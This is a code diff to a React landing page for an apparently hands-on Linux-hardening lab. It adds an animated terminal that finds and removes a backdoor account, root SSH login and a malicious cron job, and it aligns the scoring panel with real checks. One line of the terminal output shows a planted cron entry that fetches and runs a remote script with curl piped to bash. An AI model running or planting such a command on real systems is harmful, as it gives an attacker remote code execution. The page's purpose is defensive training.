@@ -35,14 +35,44 @@ function useInView<T extends HTMLElement>(onEnter: () => void) {
   return ref;
 }
 
+/**
+ * One pass over the machine the debrief below then grades: find the UID-0
+ * backdoor, close root SSH, fix the world-writable passwd file, pull the
+ * malicious cron. The four findings deliberately match `SCORE_ROWS` — the two
+ * panels on this page used to depict unrelated scenarios, which quietly
+ * undercut the claim that the debrief is about what you just did.
+ *
+ * Every line is real and every line is short enough not to wrap at the
+ * panel's width. `sudoedit` rather than a long `sed -i` for that reason: the
+ * wrapped version needed a fake PS2 continuation to look right.
+ */
 const TERMINAL_LINES = [
   { prompt: true, text: "sudo awk -F: '$3==0 {print $1}' /etc/passwd" },
   { prompt: false, text: "root" },
   { prompt: false, text: "backdoor" },
   { prompt: true, text: "sudo usermod -u 1005 backdoor" },
-  { prompt: true, text: "grep -E 'PermitRootLogin' /etc/ssh/sshd_config" },
+  { prompt: true, text: "grep -E '^PermitRootLogin' /etc/ssh/sshd_config" },
   { prompt: false, text: "PermitRootLogin yes" },
+  { prompt: true, text: "sudoedit /etc/ssh/sshd_config" },
+  { prompt: true, text: "sudo systemctl reload ssh" },
+  { prompt: true, text: "sudo find / -perm -0002 -type f 2>/dev/null" },
+  { prompt: false, text: "/etc/passwd" },
+  { prompt: true, text: "sudo chmod 644 /etc/passwd" },
+  { prompt: true, text: "sudo crontab -l -u www-data" },
+  { prompt: false, text: "*/5 * * * * curl -s http://198.51.100.23/x.sh | bash" },
+  { prompt: true, text: "sudo crontab -r -u www-data" },
 ];
+
+/**
+ * How much of the session is already on screen before anything animates.
+ *
+ * Two reasons it isn't zero. With JavaScript off — a throttled school
+ * Chromebook, a crawler — the old version rendered an empty bordered box,
+ * the same failure as the Reveal bug next door. And with JavaScript on, a
+ * panel this tall that starts empty spends its first second looking broken;
+ * a terminal you glance at has scrollback already.
+ */
+const PRELOADED_LINES = 8;
 
 /**
  * A terminal typing itself out. Not a video and not a screenshot — the real
@@ -50,27 +80,39 @@ const TERMINAL_LINES = [
  * literally what they will type in the lab.
  */
 export function TerminalDemo() {
-  const [visibleLines, setVisibleLines] = useState(0);
-  const ref = useInView<HTMLDivElement>(() => setVisibleLines(1));
+  const [visibleLines, setVisibleLines] = useState(PRELOADED_LINES);
+  const ref = useInView<HTMLDivElement>(() =>
+    setVisibleLines((n) => Math.min(n + 1, TERMINAL_LINES.length)),
+  );
 
   useEffect(() => {
-    if (visibleLines === 0 || visibleLines >= TERMINAL_LINES.length) return;
-    const timer = setTimeout(() => setVisibleLines((n) => n + 1), 520);
+    if (visibleLines <= PRELOADED_LINES || visibleLines >= TERMINAL_LINES.length) {
+      return;
+    }
+    // Prompts get typing time; their output does not, because output doesn't
+    // get typed. Same total as one flat 160ms cadence, but it reads as a
+    // person working rather than as a ticker.
+    const delay = TERMINAL_LINES[visibleLines]!.prompt ? 240 : 60;
+    const timer = setTimeout(() => setVisibleLines((n) => n + 1), delay);
     return () => clearTimeout(timer);
   }, [visibleLines]);
 
   return (
     <div
       ref={ref}
-      className="overflow-hidden rounded-md border border-hairline bg-surface"
+      className="flex h-full flex-col overflow-hidden rounded-md border border-hairline bg-surface"
     >
-      <div className="flex items-center justify-between border-b border-hairline px-4 py-2.5">
+      <div className="flex shrink-0 items-center justify-between border-b border-hairline px-4 py-2.5">
         <span className="font-mono text-[11px] uppercase tracking-[0.14em] text-text-dim">
           linux-practice
         </span>
         <span className="font-mono text-[11px] text-text-dim">root@lab</span>
       </div>
-      <div className="min-h-[188px] space-y-1 p-4 font-mono text-[13px] leading-[20px]">
+      {/* justify-end: the frame is as tall as the hero's text column, and a
+          real shell fills from the bottom. Anything else would leave the
+          output stranded at the top of an empty box. min-h covers the
+          single-column layout, where there is no sibling to match. */}
+      <div className="flex min-h-[188px] flex-1 flex-col justify-end space-y-1 p-4 font-mono text-[13px] leading-[20px]">
         {TERMINAL_LINES.slice(0, visibleLines).map((line, index) => (
           <p
             key={index}
@@ -86,20 +128,47 @@ export function TerminalDemo() {
           </p>
         ))}
         {visibleLines > 0 && visibleLines < TERMINAL_LINES.length && (
-          <span className="inline-block h-[14px] w-[7px] translate-y-0.5 animate-pulse bg-text" />
+          // self-start, because the column is a flex container now: without
+          // it the cursor stretches across the full width of the frame and
+          // reads as a loading bar rather than a caret.
+          <span className="h-[14px] w-[7px] shrink-0 translate-y-0.5 animate-pulse self-start bg-text" />
         )}
       </div>
     </div>
   );
 }
 
+/**
+ * Every row here is a REAL check from `agent/checks/linux-practice.yaml`,
+ * with its real point value, and the three "found" rows are the three graded
+ * things the terminal above actually does.
+ *
+ * It did not start that way, and the old version is worth naming so it isn't
+ * reintroduced: it advertised "World-writable /etc/passwd fixed" (no such
+ * check exists) and "Firewall left inactive" — a check that was deliberately
+ * REMOVED in DECISIONS 045, because gVisor exposes no netfilter and so no
+ * learner action could ever make it pass. Inventing plausible-sounding
+ * scoring on a marketing page is the one lie a competitor is certain to
+ * catch, since they will compare it to what their coach told them.
+ *
+ * The two "missed" rows are things the session above never attempted. That
+ * is the argument the whole page is making: a debrief is worth something
+ * precisely because it names what you didn't do.
+ *
+ * Sources, in order: uid0-backdoor, ssh-permitrootlogin, pwhistory-remember,
+ * cron-user-payload, insecure-service-absent. 52 points, 34 earned.
+ */
 const SCORE_ROWS = [
   { state: "found", title: "Second UID-0 account removed", points: 12 },
   { state: "found", title: "Root SSH login disabled", points: 12 },
-  { state: "missed", title: "Password history not enforced", points: 8 },
-  { state: "found", title: "World-writable /etc/passwd fixed", points: 8 },
-  { state: "missed", title: "Firewall left inactive", points: 10 },
+  { state: "missed", title: "Password reuse not prevented", points: 8 },
+  { state: "found", title: "Malicious user cron removed", points: 10 },
+  { state: "missed", title: "Telnet still installed", points: 10 },
 ] as const;
+
+/** Sum of the rows shown, not the lab's real total — a panel that displays
+ * five checks may not quote a denominator it isn't showing. */
+const SCORE_TOTAL = SCORE_ROWS.reduce((sum, row) => sum + row.points, 0);
 
 /**
  * The debrief, resolving one line at a time.
@@ -136,7 +205,10 @@ export function DebriefDemo() {
         <p className="text-[13px] text-text-dim">Debrief</p>
         <p className="font-mono text-[25px] font-semibold leading-[32px] tabular-nums text-text">
           {earned}
-          <span className="text-[13px] font-normal text-text-dim"> / 50</span>
+          <span className="text-[13px] font-normal text-text-dim">
+            {" "}
+            / {SCORE_TOTAL}
+          </span>
         </p>
       </div>
       <ul className="divide-y divide-hairline">
